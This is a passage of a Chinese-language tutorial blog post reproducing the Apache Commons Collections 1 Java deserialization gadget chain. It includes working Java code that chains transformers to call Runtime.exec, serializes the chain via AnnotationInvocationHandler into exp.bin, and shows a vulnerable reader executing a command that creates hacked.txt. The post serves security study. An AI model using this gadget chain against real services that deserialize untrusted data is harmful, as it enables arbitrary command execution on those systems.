1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">InvokerTransformer</strong></strong></span></span></h2><div id="https://www.notion.so/ebfc0f6f5fa442f0a26c39f4908a13e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">从名字可以看出，该类可以实现方法调用的功能</span></span></p></div><div id="https://www.notion.so/c6c56e8e03ff457db69affbad74d3bd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">举例</span></span></p></div><pre id="https://www.notion.so/2c0c34e5b9bf49d8bc0841b1d6de79b8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>public class Main {
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;String, Class&gt; innerMap = new HashMap&lt;String, Class&gt;();
+        KeyWrapper k = new KeyWrapper();
+        ValueWrapper v = new ValueWrapper();
+        InvokerTransformer i = new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class },
+                new Object[] { &quot;touch aaa&quot; });
+        Map trsMap = TransformedMap.decorate(innerMap, k, i);
+        trsMap.put(&quot;aa&quot;, Runtime.getRuntime());
+        System.out.println(trsMap);
+    }
+}</span></span></span></code></pre><h2 id="https://www.notion.so/724ac68c690d4373b2c003e3a5dfd871" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/724ac68c690d4373b2c003e3a5dfd871"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ChainedTransformer</strong></strong></span></span></h2><div id="https://www.notion.so/8c243a938c614532a0f4eb7bdc1a5c5a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">初始化时传入一个Transformer数组，进行transform时会依次调用</span></span></p></div><h2 id="https://www.notion.so/81939859550d459284f1df4b76b90f63" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/81939859550d459284f1df4b76b90f63"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ConstantTransformer</strong></strong></span></span></h2><div id="https://www.notion.so/d4878c344a3c4959b1fe132cb442563b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">返回一固定常量</span></span></p></div><div id="https://www.notion.so/e9453bdbeb904bc3bd8676c42a7bc602" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">利用上述的几个Transform，可以组合出一个可以执行任意命令的代码。这里不再像上面例子里的代码要求Map为&lt;String,Class&gt;。</span></span></p></div><pre id="https://www.notion.so/83fb67afd59543a2ae249ca2526e7234" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>public static void main(String[] args) throws Exception {
+        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;String, String&gt;();
+        KeyWrapper k = new KeyWrapper();
+        ValueWrapper v = new ValueWrapper();
+        InvokerTransformer i = new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class },
+                new Object[] { &quot;touch aaa&quot; });
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class },
+                        new Object[] { &quot;getRuntime&quot;, null }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class },
+                        new Object[] { null, null }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;touch aaa&quot; })
+        });
+
+        Map trsMap = TransformedMap.decorate(innerMap, k, chain);
+        trsMap.put(&quot;aa&quot;, &quot;bbb&quot;);
+        System.out.println(trsMap);
+    }</span></span></span></code></pre><div id="https://www.notion.so/3ab0700a5299456faf80dd77d8cfbbec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">接下来我们尝试将构造好的对象写入到文件中。在预设的攻击场景中，服务器读取不受信任的序列化数据，将其转换为Object的时候，即可载入我们的攻击代码。</span></span></p></div><div id="https://www.notion.so/b405f0834e684aeab0852f41b929bcdb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">要完成这一点，我们需要找到一个特殊的类，在调用readObject函数时，能够改变map的值。恰恰刚好，sun.reflect.annotation.AnnotationInvocationHandler这个类完美符合要求。至于如何去搜索这种gadget，业界也有人做过系统的研究，可参考</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></span></span></p></div><div id="https://www.notion.so/7b761c9416f64ebf901296d682d776ab" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4eba1ac7-7e15-45f9-bd67-5f89dfa68746%2FUntitled.png?width=1684&amp;table=block&amp;id=7b761c94-16f6-4ebf-9012-96d682d776ab"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4eba1ac7-7e15-45f9-bd67-5f89dfa68746%2FUntitled.png?width=1684&amp;table=block&amp;id=7b761c94-16f6-4ebf-9012-96d682d776ab" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3c8aa58e726c4a66935f66b774746d91" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">上面代码中，在调用readObject时，memberValue是一个Map，因此，我们构造一下攻击代码：</span></span></p></div><pre id="https://www.notion.so/c0ccb01f293c4be89b928a61055feeca" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>public class Main {
+
+    public static void main(String[] args) throws Exception {
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                 new ConstantTransformer(Runtime.class),
+                 new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class
+                 },
+                 new Object[] { &quot;getRuntime&quot;, null }),
+                 new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class
+                 },
+                 new Object[] { null, null }),
+                 new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] {
+                 &quot;touch hacked.txt&quot; })
+        });
+        HashMap innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;aaaa&quot;);
+        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
+        cons.setAccessible(true);
+        Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
+        FileOutputStream f = new FileOutputStream(&quot;exp.bin&quot;);
+        ObjectOutputStream oos = new ObjectOutputStream(f);
+        oos.writeObject(ins);
+        oos.flush();
+        oos.close();
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/f0be8f5523544bdc8294971f8a3bf643" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">下面是模拟的受攻击代码</span></span></p></div><pre id="https://www.notion.so/93ed41735af446a980bc285c0b39ccba" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>public class Exp {
+
+    public static void main(String[] args) throws Exception {
+
+        FileInputStream fi = new FileInputStream(&quot;exp.bin&quot;);
+        ObjectInputStream ois = new ObjectInputStream(fi);
+        Object d = (Object) ois
+                .readObject();
+        ois.close();
+        System.out.println(d.getClass());
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/62c6f373d1d8484bb9bf2789f8754e18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行程序，即可在当前目录下创建hack.txt文件</span></span></p></div><pre id="https://www.notion.so/c5d2e9f4c5af49ae88d3bc863e066b79" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -cp target/cc-1.jar com.Exp.Main
+$ java -cp target/cc-1.jar com.Exp.Exp
+class sun.reflect.annotation.AnnotationInvocationHandler
+$ <span class="token function">ls</span>
+dependency-reduced-pom.xml  exp.bin  hacked.txt  pom.xml  src  target</span></span></span></code></pre><h3 id="https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">复现中遇到的问题</span></span></h3><div id="https://www.notion.so/17d858c07a6e4243836241e4645dd710" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">没有执行利用代码？</span></span></p></div><div id="https://www.notion.so/d033fd458f304428bb62266a2e35aa21" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">这里使用的jdk版本为jdk1.7.0_80。在1.8以后，AnnotationInvocationHandler类进行了修复，因此不能再用上述的方法构造，运行时可能会报错</span></span></p></div><pre id="https://www.notion.so/9609258f77dd447bb63970df5fccfda3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -jar target/cc-1.jar 
+javaException <span class="token keyword">in</span> thread <span class="token string">"main"</span> java.lang.reflect.InaccessibleObjectException: Unable to <span class="token function">make</span> sun.reflect.annotation.AnnotationInvocationHandler<span class="token punctuation">(</span>java.lang.Class,java.util.Map<span class="token punctuation">)</span> accessible: module java.base does not <span class="token string">"opens sun.reflect.annotation"</span> to unnamed module @486bb9ce
+        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible<span class="token punctuation">(</span>AccessibleObject.java:354<span class="token punctuation">)</span>
+        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible<span class="token punctuation">(</span>AccessibleObject.java:297<span class="token punctuation">)</span>
+        at java.base/java.lang.reflect.Constructor.checkCanSetAccessible<span class="token punctuation">(</span>Constructor.java:191<span class="token punctuation">)</span>
+        at java.base/java.lang.reflect.Constructor.setAccessible<span class="token punctuation">(</span>Constructor.java:184<span class="token punctuation">)</span>
+        at com.Exp.Main.main<span class="token punctuation">(</span>Main.java:45<span class="token punctuation">)</span>
+</span></span></span></code></pre><div id="https://www.notion.so/000d391a631f4394b01450d12bd48c80" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/53ab926230354864970a7ce5facc2fbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">实验源代码：</span></span></p></div><div></div><div id="https://www.notion.so/8389fafa2de248c1ae257129a1b4b215" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">参考链接：</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://su18.org/post/ysoserial-su18-2/">https://su18.org/post/ysoserial-su18-2/</a></span></span></p></div><div id="https://www.notion.so/d2dbdcf01ca043019d0eef3e17251cd3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/67bc48b11c074a14be03741e9268ee7c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b963ce1e5c85470489a5f33bc8b73b58" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/607a1a5c25b841e1a86936756a931ee7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/07064f1f9e9f4daba103de5375764ddd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5eec93bb9e294fc7bcb80e084846afe5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/666fd3b522674c4d932c29e81b8b50ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+<script src="https://utteranc.es/client.js"
+        repo="hzshang/hzshang.github.io"
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+  <footer class="Footer">
+  <div>&copy; Roadmap of Learning 2019-2021</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+</body>
+
+</html>
